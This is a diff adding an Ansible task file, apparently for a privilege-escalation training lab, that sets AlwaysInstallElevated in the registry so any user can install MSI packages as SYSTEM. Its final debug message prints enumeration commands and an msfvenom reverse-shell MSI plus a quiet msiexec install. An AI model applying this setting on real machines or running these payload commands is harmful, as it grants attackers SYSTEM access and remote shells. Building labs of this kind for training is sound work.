@@ -1,0 +1,40 @@
+---
+# AlwaysInstallElevated Lab Setup
+# Sets AlwaysInstallElevated = 1 in both HKLM and HKCU registry hives.
+# Any user can install MSI packages with SYSTEM privileges.
+#
+# Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md
+
+- name: Set AlwaysInstallElevated in HKLM
+  ansible.windows.win_regedit:
+    path: HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
+    name: AlwaysInstallElevated
+    data: 1
+    type: dword
+    state: present
+
+- name: Set AlwaysInstallElevated in HKCU for victim user
+  ansible.windows.win_shell: |
+    # Load the victim user's hive and set the key
+    if ("{{ ludus_win_privesc_victim_user_type }}" -eq "domain") {
+      $userSid = (New-Object System.Security.Principal.NTAccount("{{ ludus_win_privesc_domain | default("") }}\{{ ludus_win_privesc_victim_user }}")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+      $ntuser  = "C:\Users\{{ ludus_win_privesc_victim_user }}\NTUSER.DAT"
+    } else {
+      $userSid = (Get-LocalUser -Name "{{ ludus_win_privesc_victim_user }}").SID.Value
+      $ntuser  = "C:\Users\{{ ludus_win_privesc_victim_user }}\NTUSER.DAT"
+    }
+    reg load HKU\$userSid $ntuser 2>$null | Out-Null
+    reg add "HKU\$userSid\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f | Out-Null
+    reg unload HKU\$userSid 2>$null | Out-Null
+
+    # Also set under current HKCU so it's active for the current session
+    reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f | Out-Null
+
+- name: Print AlwaysInstallElevated scenario info
+  ansible.builtin.debug:
+    msg:
+      - "=== AlwaysInstallElevated Scenario ==="
+      - "Enumerate: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+      - "           reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+      - "Exploit:   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi > evil.msi"
+      - "           msiexec /quiet /qn /i evil.msi"
